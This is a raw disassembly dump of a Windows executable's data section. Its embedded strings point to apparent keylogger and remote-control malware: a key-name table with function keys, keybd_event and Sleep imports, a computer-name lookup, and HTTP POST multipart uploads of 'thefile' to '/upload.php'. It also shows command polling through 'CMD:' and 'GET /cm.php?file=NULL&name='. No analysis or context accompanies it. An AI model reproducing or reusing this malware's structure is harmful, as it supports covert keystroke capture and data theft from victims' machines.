  402dbd:	a3 40 00 00 00       	mov    %eax,0x40
  402dc2:	00 00                	add    %al,(%eax)
  402dc4:	00 00                	add    %al,(%eax)
  402dc6:	00 00                	add    %al,(%eax)
  402dc8:	a1 9c a3 40 00       	mov    0x40a39c,%eax
  402dcd:	0b c0                	or     %eax,%eax
  402dcf:	74 02                	je     0x402dd3
  402dd1:	ff e0                	jmp    *%eax
  402dd3:	68 b0 2d 40 00       	push   $0x402db0
  402dd8:	b8 30 15 40 00       	mov    $0x401530,%eax
  402ddd:	ff d0                	call   *%eax
  402ddf:	ff e0                	jmp    *%eax
  402de1:	00 00                	add    %al,(%eax)
  402de3:	00 0d 00 00 00 6b    	add    %cl,0x6b000000
  402de9:	65 72 6e             	gs jb  0x402e5a
  402dec:	65 6c                	gs insb (%dx),%es:(%edi)
  402dee:	33 32                	xor    (%edx),%esi
  402df0:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  402df3:	6c                   	insb   (%dx),%es:(%edi)
  402df4:	00 00                	add    %al,(%eax)
  402df6:	00 00                	add    %al,(%eax)
  402df8:	06                   	push   %es
  402df9:	00 00                	add    %al,(%eax)
  402dfb:	00 53 6c             	add    %dl,0x6c(%ebx)
  402dfe:	65 65 70 00          	gs gs jo 0x402e02
  402e02:	00 00                	add    %al,(%eax)
  402e04:	e8 2d 40 00 fc       	call   0xfc406e36
  402e09:	2d 40 00 00 00       	sub    $0x40,%eax
  402e0e:	04 00                	add    $0x0,%al
  402e10:	a0 a3 40 00 00       	mov    0x40a3,%al
  402e15:	00 00                	add    %al,(%eax)
  402e17:	00 00                	add    %al,(%eax)
  402e19:	00 00                	add    %al,(%eax)
  402e1b:	00 a1 a8 a3 40 00    	add    %ah,0x40a3a8(%ecx)
  402e21:	0b c0                	or     %eax,%eax
  402e23:	74 02                	je     0x402e27
  402e25:	ff e0                	jmp    *%eax
  402e27:	68 04 2e 40 00       	push   $0x402e04
  402e2c:	b8 30 15 40 00       	mov    $0x401530,%eax
  402e31:	ff d0                	call   *%eax
  402e33:	ff e0                	jmp    *%eax
  402e35:	00 00                	add    %al,(%eax)
  402e37:	00 0b                	add    %cl,(%ebx)
  402e39:	00 00                	add    %al,(%eax)
  402e3b:	00 75 73             	add    %dh,0x73(%ebp)
  402e3e:	65 72 33             	gs jb  0x402e74
  402e41:	32 2e                	xor    (%esi),%ch
  402e43:	64 6c                	fs insb (%dx),%es:(%edi)
  402e45:	6c                   	insb   (%dx),%es:(%edi)
  402e46:	00 00                	add    %al,(%eax)
  402e48:	0c 00                	or     $0x0,%al
  402e4a:	00 00                	add    %al,(%eax)
  402e4c:	6b 65 79 62          	imul   $0x62,0x79(%ebp),%esp
  402e50:	64 5f                	fs pop %edi
  402e52:	65 76 65             	gs jbe 0x402eba
  402e55:	6e                   	outsb  %ds:(%esi),(%dx)
  402e56:	74 00                	je     0x402e58
  402e58:	3c 2e                	cmp    $0x2e,%al
  402e5a:	40                   	inc    %eax
  402e5b:	00 4c 2e 40          	add    %cl,0x40(%esi,%ebp,1)
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	00 04 00             	add    %al,(%eax,%eax,1)
  402e64:	ac                   	lods   %ds:(%esi),%al
  402e65:	a3 40 00 00 00       	mov    %eax,0x40
  402e6a:	00 00                	add    %al,(%eax)
  402e6c:	00 00                	add    %al,(%eax)
  402e6e:	00 00                	add    %al,(%eax)
  402e70:	a1 b4 a3 40 00       	mov    0x40a3b4,%eax
  402e75:	0b c0                	or     %eax,%eax
  402e77:	74 02                	je     0x402e7b
  402e79:	ff e0                	jmp    *%eax
  402e7b:	68 58 2e 40 00       	push   $0x402e58
  402e80:	b8 30 15 40 00       	mov    $0x401530,%eax
  402e85:	ff d0                	call   *%eax
  402e87:	ff e0                	jmp    *%eax
  402e89:	00 00                	add    %al,(%eax)
  402e8b:	00 23                	add    %ah,(%ebx)
  402e8d:	3d fb fc fa a0       	cmp    $0xa0fafcfb,%eax
  402e92:	68 10 a7 38 08       	push   $0x838a710
  402e97:	00 2b                	add    %ch,(%ebx)
  402e99:	33 71 b5             	xor    -0x4b(%ecx),%esi
  402e9c:	22 3d fb fc fa a0    	and    0xa0fafcfb,%bh
  402ea2:	68 10 a7 38 08       	push   $0x838a710
  402ea7:	00 2b                	add    %ch,(%ebx)
  402ea9:	33 71 b5             	xor    -0x4b(%ecx),%esi
  402eac:	02 00                	add    (%eax),%al
  402eae:	00 00                	add    %al,(%eax)
  402eb0:	8c 2e                	mov    %gs,(%esi)
  402eb2:	40                   	inc    %eax
  402eb3:	00 9c 2e 40 00 00 00 	add    %bl,0x40(%esi,%ebp,1)
  402eba:	00 00                	add    %al,(%eax)
  402ebc:	79 4f                	jns    0x402f0d
  402ebe:	ad                   	lods   %ds:(%esi),%eax
  402ebf:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402ec5:	0c 00                	or     $0x0,%al
  402ec7:	aa                   	stos   %al,%es:(%edi)
  402ec8:	00 60 d3             	add    %ah,-0x2d(%eax)
  402ecb:	93                   	xchg   %eax,%ebx
  402ecc:	18 00                	sbb    %al,(%eax)
  402ece:	00 00                	add    %al,(%eax)
  402ed0:	63 00                	arpl   %eax,(%eax)
  402ed2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ed3:	00 6d 00             	add    %ch,0x0(%ebp)
  402ed6:	70 00                	jo     0x402ed8
  402ed8:	75 00                	jne    0x402eda
  402eda:	74 00                	je     0x402edc
  402edc:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  402ee0:	6e                   	outsb  %ds:(%esi),(%dx)
  402ee1:	00 61 00             	add    %ah,0x0(%ecx)
  402ee4:	6d                   	insl   (%dx),%es:(%edi)
  402ee5:	00 65 00             	add    %ah,0x0(%ebp)
  402ee8:	00 00                	add    %al,(%eax)
  402eea:	00 00                	add    %al,(%eax)
  402eec:	08 00                	or     %al,(%eax)
  402eee:	00 00                	add    %al,(%eax)
  402ef0:	74 00                	je     0x402ef2
  402ef2:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  402ef6:	70 00                	jo     0x402ef8
  402ef8:	00 00                	add    %al,(%eax)
  402efa:	00 00                	add    %al,(%eax)
  402efc:	10 00                	adc    %al,(%eax)
  402efe:	00 00                	add    %al,(%eax)
  402f00:	48                   	dec    %eax
  402f01:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  402f05:	00 50 00             	add    %dl,0x0(%eax)
  402f08:	2f                   	das
  402f09:	00 31                	add    %dh,(%ecx)
  402f0b:	00 2e                	add    %ch,(%esi)
  402f0d:	00 30                	add    %dh,(%eax)
  402f0f:	00 00                	add    %al,(%eax)
  402f11:	00 00                	add    %al,(%eax)
  402f13:	00 08                	add    %cl,(%eax)
  402f15:	00 00                	add    %al,(%eax)
  402f17:	00 50 00             	add    %dl,0x0(%eax)
  402f1a:	4f                   	dec    %edi
  402f1b:	00 53 00             	add    %dl,0x0(%ebx)
  402f1e:	54                   	push   %esp
  402f1f:	00 00                	add    %al,(%eax)
  402f21:	00 00                	add    %al,(%eax)
  402f23:	00 58 00             	add    %bl,0x0(%eax)
  402f26:	00 00                	add    %al,(%eax)
  402f28:	43                   	inc    %ebx
  402f29:	00 6f 00             	add    %ch,0x0(%edi)
  402f2c:	6e                   	outsb  %ds:(%esi),(%dx)
  402f2d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  402f31:	00 6e 00             	add    %ch,0x0(%esi)
  402f34:	74 00                	je     0x402f36
  402f36:	2d 00 54 00 79       	sub    $0x79005400,%eax
  402f3b:	00 70 00             	add    %dh,0x0(%eax)
  402f3e:	65 00 3a             	add    %bh,%gs:(%edx)
  402f41:	00 20                	add    %ah,(%eax)
  402f43:	00 6d 00             	add    %ch,0x0(%ebp)
  402f46:	75 00                	jne    0x402f48
  402f48:	6c                   	insb   (%dx),%es:(%edi)
  402f49:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  402f4d:	00 70 00             	add    %dh,0x0(%eax)
  402f50:	61                   	popa
  402f51:	00 72 00             	add    %dh,0x0(%edx)
  402f54:	74 00                	je     0x402f56
  402f56:	2f                   	das
  402f57:	00 66 00             	add    %ah,0x0(%esi)
  402f5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402f5b:	00 72 00             	add    %dh,0x0(%edx)
  402f5e:	6d                   	insl   (%dx),%es:(%edi)
  402f5f:	00 2d 00 64 00 61    	add    %ch,0x61006400
  402f65:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  402f69:	00 3b                	add    %bh,(%ebx)
  402f6b:	00 20                	add    %ah,(%eax)
  402f6d:	00 62 00             	add    %ah,0x0(%edx)
  402f70:	6f                   	outsl  %ds:(%esi),(%dx)
  402f71:	00 75 00             	add    %dh,0x0(%ebp)
  402f74:	6e                   	outsb  %ds:(%esi),(%dx)
  402f75:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  402f79:	00 72 00             	add    %dh,0x0(%edx)
  402f7c:	79 00                	jns    0x402f7e
  402f7e:	3d 00 00 00 00       	cmp    $0x0,%eax
  402f83:	00 04 00             	add    %al,(%eax,%eax,1)
  402f86:	00 00                	add    %al,(%eax)
  402f88:	0d 00 0a 00 00       	or     $0xa00,%eax
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	00 04 00             	add    %al,(%eax,%eax,1)
  402f92:	00 00                	add    %al,(%eax)
  402f94:	2d 00 2d 00 00       	sub    $0x2d00,%eax
  402f99:	00 00                	add    %al,(%eax)
  402f9b:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  402f9f:	00 43 00             	add    %al,0x0(%ebx)
  402fa2:	6f                   	outsl  %ds:(%esi),(%dx)
  402fa3:	00 6e 00             	add    %ch,0x0(%esi)
  402fa6:	74 00                	je     0x402fa8
  402fa8:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  402fac:	74 00                	je     0x402fae
  402fae:	2d 00 44 00 69       	sub    $0x69004400,%eax
  402fb3:	00 73 00             	add    %dh,0x0(%ebx)
  402fb6:	70 00                	jo     0x402fb8
  402fb8:	6f                   	outsl  %ds:(%esi),(%dx)
  402fb9:	00 73 00             	add    %dh,0x0(%ebx)
  402fbc:	69 00 74 00 69 00    	imul   $0x690074,(%eax),%eax
  402fc2:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc3:	00 6e 00             	add    %ch,0x0(%esi)
  402fc6:	3a 00                	cmp    (%eax),%al
  402fc8:	20 00                	and    %al,(%eax)
  402fca:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  402fce:	72 00                	jb     0x402fd0
  402fd0:	6d                   	insl   (%dx),%es:(%edi)
  402fd1:	00 2d 00 64 00 61    	add    %ch,0x61006400
  402fd7:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  402fdb:	00 3b                	add    %bh,(%ebx)
  402fdd:	00 20                	add    %ah,(%eax)
  402fdf:	00 6e 00             	add    %ch,0x0(%esi)
  402fe2:	61                   	popa
  402fe3:	00 6d 00             	add    %ch,0x0(%ebp)
  402fe6:	65 00 3d 00 22 00 64 	add    %bh,%gs:0x64002200
  402fed:	00 65 00             	add    %ah,0x0(%ebp)
  402ff0:	73 00                	jae    0x402ff2
  402ff2:	63 00                	arpl   %eax,(%eax)
  402ff4:	72 00                	jb     0x402ff6
  402ff6:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  402ffc:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403002:	22 00                	and    (%eax),%al
  403004:	00 00                	add    %al,(%eax)
  403006:	00 00                	add    %al,(%eax)
  403008:	08 00                	or     %al,(%eax)
  40300a:	00 00                	add    %al,(%eax)
  40300c:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  403010:	70 00                	jo     0x403012
  403012:	67 00 00             	add    %al,(%bx,%si)
  403015:	00 00                	add    %al,(%eax)
  403017:	00 49 4f             	add    %cl,0x4f(%ecx)
  40301a:	ad                   	lods   %ds:(%esi),%eax
  40301b:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  403021:	0c 00                	or     $0x0,%al
  403023:	aa                   	stos   %al,%es:(%edi)
  403024:	00 60 d3             	add    %ah,-0x2d(%eax)
  403027:	93                   	xchg   %eax,%ebx
  403028:	81 09 f8 7b 32 bf    	orl    $0xbf327bf8,(%ecx)
  40302e:	1a 10                	sbb    (%eax),%dl
  403030:	8b bb 00 aa 00 30    	mov    0x3000aa00(%ebx),%edi
  403036:	0c ab                	or     $0xab,%al
  403038:	e1 4e                	loope  0x403088
  40303a:	ad                   	lods   %ds:(%esi),%eax
  40303b:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  403041:	0c 00                	or     $0x0,%al
  403043:	aa                   	stos   %al,%es:(%edi)
  403044:	00 60 d3             	add    %ah,-0x2d(%eax)
  403047:	93                   	xchg   %eax,%ebx
  403048:	00 00                	add    %al,(%eax)
  40304a:	00 00                	add    %al,(%eax)
  40304c:	74 00                	je     0x40304e
  40304e:	00 00                	add    %al,(%eax)
  403050:	43                   	inc    %ebx
  403051:	00 6f 00             	add    %ch,0x0(%edi)
  403054:	6e                   	outsb  %ds:(%esi),(%dx)
  403055:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  403059:	00 6e 00             	add    %ch,0x0(%esi)
  40305c:	74 00                	je     0x40305e
  40305e:	2d 00 44 00 69       	sub    $0x69004400,%eax
  403063:	00 73 00             	add    %dh,0x0(%ebx)
  403066:	70 00                	jo     0x403068
  403068:	6f                   	outsl  %ds:(%esi),(%dx)
  403069:	00 73 00             	add    %dh,0x0(%ebx)
  40306c:	69 00 74 00 69 00    	imul   $0x690074,(%eax),%eax
  403072:	6f                   	outsl  %ds:(%esi),(%dx)
  403073:	00 6e 00             	add    %ch,0x0(%esi)
  403076:	3a 00                	cmp    (%eax),%al
  403078:	20 00                	and    %al,(%eax)
  40307a:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40307e:	72 00                	jb     0x403080
  403080:	6d                   	insl   (%dx),%es:(%edi)
  403081:	00 2d 00 64 00 61    	add    %ch,0x61006400
  403087:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40308b:	00 3b                	add    %bh,(%ebx)
  40308d:	00 20                	add    %ah,(%eax)
  40308f:	00 6e 00             	add    %ch,0x0(%esi)
  403092:	61                   	popa
  403093:	00 6d 00             	add    %ch,0x0(%ebp)
  403096:	65 00 3d 00 22 00 74 	add    %bh,%gs:0x74002200
  40309d:	00 68 00             	add    %ch,0x0(%eax)
  4030a0:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  4030a4:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4030aa:	22 00                	and    (%eax),%al
  4030ac:	3b 00                	cmp    (%eax),%eax
  4030ae:	20 00                	and    %al,(%eax)
  4030b0:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  4030b4:	6c                   	insb   (%dx),%es:(%edi)
  4030b5:	00 65 00             	add    %ah,0x0(%ebp)
  4030b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4030b9:	00 61 00             	add    %ah,0x0(%ecx)
  4030bc:	6d                   	insl   (%dx),%es:(%edi)
  4030bd:	00 65 00             	add    %ah,0x0(%ebp)
  4030c0:	3d 00 22 00 00       	cmp    $0x2200,%eax
  4030c5:	00 00                	add    %al,(%eax)
  4030c7:	00 02                	add    %al,(%edx)
  4030c9:	00 00                	add    %al,(%eax)
  4030cb:	00 22                	add    %ah,(%edx)
  4030cd:	00 00                	add    %al,(%eax)
  4030cf:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  4030d3:	00 43 00             	add    %al,0x0(%ebx)
  4030d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4030d7:	00 6e 00             	add    %ch,0x0(%esi)
  4030da:	74 00                	je     0x4030dc
  4030dc:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4030e0:	74 00                	je     0x4030e2
  4030e2:	2d 00 54 00 79       	sub    $0x79005400,%eax
  4030e7:	00 70 00             	add    %dh,0x0(%eax)
  4030ea:	65 00 3a             	add    %bh,%gs:(%edx)
  4030ed:	00 20                	add    %ah,(%eax)
  4030ef:	00 61 00             	add    %ah,0x0(%ecx)
  4030f2:	70 00                	jo     0x4030f4
  4030f4:	70 00                	jo     0x4030f6
  4030f6:	6c                   	insb   (%dx),%es:(%edi)
  4030f7:	00 69 00             	add    %ch,0x0(%ecx)
  4030fa:	63 00                	arpl   %eax,(%eax)
  4030fc:	61                   	popa
  4030fd:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  403101:	00 6f 00             	add    %ch,0x0(%edi)
  403104:	6e                   	outsb  %ds:(%esi),(%dx)
  403105:	00 2f                	add    %ch,(%edi)
  403107:	00 6f 00             	add    %ch,0x0(%edi)
  40310a:	63 00                	arpl   %eax,(%eax)
  40310c:	74 00                	je     0x40310e
  40310e:	65 00 74 00 2d       	add    %dh,%gs:0x2d(%eax,%eax,1)
  403113:	00 73 00             	add    %dh,0x0(%ebx)
  403116:	74 00                	je     0x403118
  403118:	72 00                	jb     0x40311a
  40311a:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40311e:	6d                   	insl   (%dx),%es:(%edi)
  40311f:	00 00                	add    %al,(%eax)
  403121:	00 00                	add    %al,(%eax)
  403123:	00 d9                	add    %bl,%cl
  403125:	4e                   	dec    %esi
  403126:	ad                   	lods   %ds:(%esi),%eax
  403127:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  40312d:	0c 00                	or     $0x0,%al
  40312f:	aa                   	stos   %al,%es:(%edi)
  403130:	00 60 d3             	add    %ah,-0x2d(%eax)
  403133:	93                   	xchg   %eax,%ebx
  403134:	0e                   	push   %cs
  403135:	00 00                	add    %al,(%eax)
  403137:	00 68 00             	add    %ch,0x0(%eax)
  40313a:	74 00                	je     0x40313c
  40313c:	74 00                	je     0x40313e
  40313e:	70 00                	jo     0x403140
  403140:	3a 00                	cmp    (%eax),%al
  403142:	2f                   	das
  403143:	00 2f                	add    %ch,(%edi)
  403145:	00 00                	add    %al,(%eax)
  403147:	00 02                	add    %al,(%edx)
  403149:	00 00                	add    %al,(%eax)
  40314b:	00 2f                	add    %ch,(%edi)
  40314d:	00 00                	add    %al,(%eax)
  40314f:	00 08                	add    %cl,(%eax)
  403151:	00 00                	add    %al,(%eax)
  403153:	00 2e                	add    %ch,(%esi)
  403155:	00 63 00             	add    %ah,0x0(%ebx)
  403158:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40315c:	00 00                	add    %al,(%eax)
  40315e:	00 00                	add    %al,(%eax)
  403160:	08 00                	or     %al,(%eax)
  403162:	00 00                	add    %al,(%eax)
  403164:	43                   	inc    %ebx
  403165:	00 4d 00             	add    %cl,0x0(%ebp)
  403168:	44                   	inc    %esp
  403169:	00 3a                	add    %bh,(%edx)
	...
  403177:	00 06                	add    %al,(%esi)
  403179:	00 00                	add    %al,(%eax)
  40317b:	00 47 00             	add    %al,0x0(%edi)
  40317e:	45                   	inc    %ebp
  40317f:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  403183:	00 22                	add    %ah,(%edx)
  403185:	00 00                	add    %al,(%eax)
  403187:	00 2f                	add    %ch,(%edi)
  403189:	00 63 00             	add    %ah,0x0(%ebx)
  40318c:	6d                   	insl   (%dx),%es:(%edi)
  40318d:	00 2e                	add    %ch,(%esi)
  40318f:	00 70 00             	add    %dh,0x0(%eax)
  403192:	68 00 70 00 3f       	push   $0x3f007000
  403197:	00 66 00             	add    %ah,0x0(%esi)
  40319a:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4031a0:	3d 00 4e 00 55       	cmp    $0x55004e00,%eax
  4031a5:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  4031a9:	00 00                	add    %al,(%eax)
  4031ab:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4031ae:	00 00                	add    %al,(%eax)
  4031b0:	26 00 6e 00          	add    %ch,%es:0x0(%esi)
  4031b4:	61                   	popa
  4031b5:	00 6d 00             	add    %ch,0x0(%ebp)
  4031b8:	65 00 3d 00 00 00 00 	add    %bh,%gs:0x0
  4031bf:	00 08                	add    %cl,(%eax)
  4031c1:	00 00                	add    %al,(%eax)
  4031c3:	00 53 00             	add    %dl,0x0(%ebx)
  4031c6:	4e                   	dec    %esi
  4031c7:	00 44 00 3a          	add    %al,0x3a(%eax,%eax,1)
  4031cb:	00 00                	add    %al,(%eax)
  4031cd:	00 00                	add    %al,(%eax)
  4031cf:	00 16                	add    %dl,(%esi)
  4031d1:	00 00                	add    %al,(%eax)
  4031d3:	00 2f                	add    %ch,(%edi)
  4031d5:	00 75 00             	add    %dh,0x0(%ebp)
  4031d8:	70 00                	jo     0x4031da
  4031da:	6c                   	insb   (%dx),%es:(%edi)
  4031db:	00 6f 00             	add    %ch,0x0(%edi)
  4031de:	61                   	popa
  4031df:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  4031e3:	00 70 00             	add    %dh,0x0(%eax)
  4031e6:	68 00 70 00 00       	push   $0x7000
  4031eb:	00 02                	add    %al,(%edx)
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	00 5f 00             	add    %bl,0x0(%edi)
  4031f2:	00 00                	add    %al,(%eax)
  4031f4:	02 00                	add    (%eax),%al
  4031f6:	00 00                	add    %al,(%eax)
  4031f8:	5c                   	pop    %esp
  4031f9:	00 00                	add    %al,(%eax)
  4031fb:	00 12                	add    %dl,(%edx)
  4031fd:	00 00                	add    %al,(%eax)
  4031ff:	00 5b 00             	add    %bl,0x0(%ebx)
  403202:	20 00                	and    %al,(%eax)
  403204:	49                   	dec    %ecx
  403205:	00 4e 00             	add    %cl,0x0(%esi)
  403208:	56                   	push   %esi
  403209:	00 49 00             	add    %cl,0x0(%ecx)
  40320c:	4f                   	dec    %edi
  40320d:	00 20                	add    %ah,(%eax)
  40320f:	00 5d 00             	add    %bl,0x0(%ebp)
  403212:	00 00                	add    %al,(%eax)
  403214:	02 00                	add    (%eax),%al
  403216:	00 00                	add    %al,(%eax)
  403218:	30 00                	xor    %al,(%eax)
  40321a:	00 00                	add    %al,(%eax)
  40321c:	02 00                	add    (%eax),%al
  40321e:	00 00                	add    %al,(%eax)
  403220:	31 00                	xor    %eax,(%eax)
  403222:	00 00                	add    %al,(%eax)
  403224:	02 00                	add    (%eax),%al
  403226:	00 00                	add    %al,(%eax)
  403228:	32 00                	xor    (%eax),%al
  40322a:	00 00                	add    %al,(%eax)
  40322c:	02 00                	add    (%eax),%al
  40322e:	00 00                	add    %al,(%eax)
  403230:	33 00                	xor    (%eax),%eax
  403232:	00 00                	add    %al,(%eax)
  403234:	02 00                	add    (%eax),%al
  403236:	00 00                	add    %al,(%eax)
  403238:	34 00                	xor    $0x0,%al
  40323a:	00 00                	add    %al,(%eax)
  40323c:	02 00                	add    (%eax),%al
  40323e:	00 00                	add    %al,(%eax)
  403240:	35 00 00 00 02       	xor    $0x2000000,%eax
  403245:	00 00                	add    %al,(%eax)
  403247:	00 36                	add    %dh,(%esi)
  403249:	00 00                	add    %al,(%eax)
  40324b:	00 02                	add    %al,(%edx)
  40324d:	00 00                	add    %al,(%eax)
  40324f:	00 37                	add    %dh,(%edi)
  403251:	00 00                	add    %al,(%eax)
  403253:	00 02                	add    %al,(%edx)
  403255:	00 00                	add    %al,(%eax)
  403257:	00 38                	add    %bh,(%eax)
  403259:	00 00                	add    %al,(%eax)
  40325b:	00 02                	add    %al,(%edx)
  40325d:	00 00                	add    %al,(%eax)
  40325f:	00 39                	add    %bh,(%ecx)
  403261:	00 00                	add    %al,(%eax)
  403263:	00 02                	add    %al,(%edx)
  403265:	00 00                	add    %al,(%eax)
  403267:	00 2a                	add    %ch,(%edx)
  403269:	00 00                	add    %al,(%eax)
  40326b:	00 02                	add    %al,(%edx)
  40326d:	00 00                	add    %al,(%eax)
  40326f:	00 2b                	add    %ch,(%ebx)
  403271:	00 00                	add    %al,(%eax)
  403273:	00 02                	add    %al,(%edx)
  403275:	00 00                	add    %al,(%eax)
  403277:	00 2d 00 00 00 02    	add    %ch,0x2000000
  40327d:	00 00                	add    %al,(%eax)
  40327f:	00 2e                	add    %ch,(%esi)
  403281:	00 00                	add    %al,(%eax)
  403283:	00 02                	add    %al,(%edx)
  403285:	00 00                	add    %al,(%eax)
  403287:	00 3d 00 00 00 02    	add    %bh,0x2000000
  40328d:	00 00                	add    %al,(%eax)
  40328f:	00 21                	add    %ah,(%ecx)
  403291:	00 00                	add    %al,(%eax)
  403293:	00 02                	add    %al,(%edx)
  403295:	00 00                	add    %al,(%eax)
  403297:	00 a3 00 00 00 02    	add    %ah,0x2000000(%ebx)
  40329d:	00 00                	add    %al,(%eax)
  40329f:	00 24 00             	add    %ah,(%eax,%eax,1)
  4032a2:	00 00                	add    %al,(%eax)
  4032a4:	02 00                	add    (%eax),%al
  4032a6:	00 00                	add    %al,(%eax)
  4032a8:	25 00 00 00 02       	and    $0x2000000,%eax
  4032ad:	00 00                	add    %al,(%eax)
  4032af:	00 26                	add    %ah,(%esi)
  4032b1:	00 00                	add    %al,(%eax)
  4032b3:	00 02                	add    %al,(%edx)
  4032b5:	00 00                	add    %al,(%eax)
  4032b7:	00 28                	add    %ch,(%eax)
  4032b9:	00 00                	add    %al,(%eax)
  4032bb:	00 02                	add    %al,(%edx)
  4032bd:	00 00                	add    %al,(%eax)
  4032bf:	00 29                	add    %ch,(%ecx)
  4032c1:	00 00                	add    %al,(%eax)
  4032c3:	00 08                	add    %cl,(%eax)
  4032c5:	00 00                	add    %al,(%eax)
  4032c7:	00 20                	add    %ah,(%eax)
  4032c9:	00 46 00             	add    %al,0x0(%esi)
  4032cc:	31 00                	xor    %eax,(%eax)
  4032ce:	20 00                	and    %al,(%eax)
  4032d0:	00 00                	add    %al,(%eax)
  4032d2:	00 00                	add    %al,(%eax)
  4032d4:	08 00                	or     %al,(%eax)
  4032d6:	00 00                	add    %al,(%eax)
  4032d8:	20 00                	and    %al,(%eax)
  4032da:	46                   	inc    %esi
  4032db:	00 32                	add    %dh,(%edx)
  4032dd:	00 20                	add    %ah,(%eax)
  4032df:	00 00                	add    %al,(%eax)
  4032e1:	00 00                	add    %al,(%eax)
  4032e3:	00 08                	add    %cl,(%eax)
  4032e5:	00 00                	add    %al,(%eax)
  4032e7:	00 20                	add    %ah,(%eax)
  4032e9:	00 46 00             	add    %al,0x0(%esi)
  4032ec:	33 00                	xor    (%eax),%eax
  4032ee:	20 00                	and    %al,(%eax)
  4032f0:	00 00                	add    %al,(%eax)
  4032f2:	00 00                	add    %al,(%eax)
  4032f4:	08 00                	or     %al,(%eax)
  4032f6:	00 00                	add    %al,(%eax)
  4032f8:	20 00                	and    %al,(%eax)
  4032fa:	46                   	inc    %esi
  4032fb:	00 34 00             	add    %dh,(%eax,%eax,1)
  4032fe:	20 00                	and    %al,(%eax)
  403300:	00 00                	add    %al,(%eax)
  403302:	00 00                	add    %al,(%eax)
  403304:	08 00                	or     %al,(%eax)
  403306:	00 00                	add    %al,(%eax)
  403308:	20 00                	and    %al,(%eax)
  40330a:	46                   	inc    %esi
  40330b:	00 35 00 20 00 00    	add    %dh,0x2000
  403311:	00 00                	add    %al,(%eax)
  403313:	00 08                	add    %cl,(%eax)
  403315:	00 00                	add    %al,(%eax)
  403317:	00 20                	add    %ah,(%eax)
  403319:	00 46 00             	add    %al,0x0(%esi)
  40331c:	36 00 20             	add    %ah,%ss:(%eax)
  40331f:	00 00                	add    %al,(%eax)
  403321:	00 00                	add    %al,(%eax)
  403323:	00 08                	add    %cl,(%eax)
  403325:	00 00                	add    %al,(%eax)
  403327:	00 20                	add    %ah,(%eax)
  403329:	00 46 00             	add    %al,0x0(%esi)
  40332c:	37                   	aaa
  40332d:	00 20                	add    %ah,(%eax)
  40332f:	00 00                	add    %al,(%eax)
  403331:	00 00                	add    %al,(%eax)
  403333:	00 08                	add    %cl,(%eax)
  403335:	00 00                	add    %al,(%eax)
  403337:	00 20                	add    %ah,(%eax)
  403339:	00 46 00             	add    %al,0x0(%esi)
  40333c:	38 00                	cmp    %al,(%eax)
  40333e:	20 00                	and    %al,(%eax)
  403340:	00 00                	add    %al,(%eax)
  403342:	00 00                	add    %al,(%eax)
  403344:	08 00                	or     %al,(%eax)
  403346:	00 00                	add    %al,(%eax)
  403348:	20 00                	and    %al,(%eax)
  40334a:	46                   	inc    %esi
  40334b:	00 39                	add    %bh,(%ecx)
  40334d:	00 20                	add    %ah,(%eax)
  40334f:	00 00                	add    %al,(%eax)
  403351:	00 00                	add    %al,(%eax)
  403353:	00 0a                	add    %cl,(%edx)
  403355:	00 00                	add    %al,(%eax)
  403357:	00 20                	add    %ah,(%eax)
  403359:	00 46 00             	add    %al,0x0(%esi)
  40335c:	31 00                	xor    %eax,(%eax)
  40335e:	30 00                	xor    %al,(%eax)
  403360:	20 00                	and    %al,(%eax)
  403362:	00 00                	add    %al,(%eax)
  403364:	0a 00                	or     (%eax),%al
  403366:	00 00                	add    %al,(%eax)
  403368:	20 00                	and    %al,(%eax)
  40336a:	46                   	inc    %esi
  40336b:	00 31                	add    %dh,(%ecx)
  40336d:	00 31                	add    %dh,(%ecx)
  40336f:	00 20                	add    %ah,(%eax)
  403371:	00 00                	add    %al,(%eax)
  403373:	00 0a                	add    %cl,(%edx)
  403375:	00 00                	add    %al,(%eax)
  403377:	00 20                	add    %ah,(%eax)
  403379:	00 46 00             	add    %al,0x0(%esi)
  40337c:	31 00                	xor    %eax,(%eax)
  40337e:	32 00                	xor    (%eax),%al
  403380:	20 00                	and    %al,(%eax)
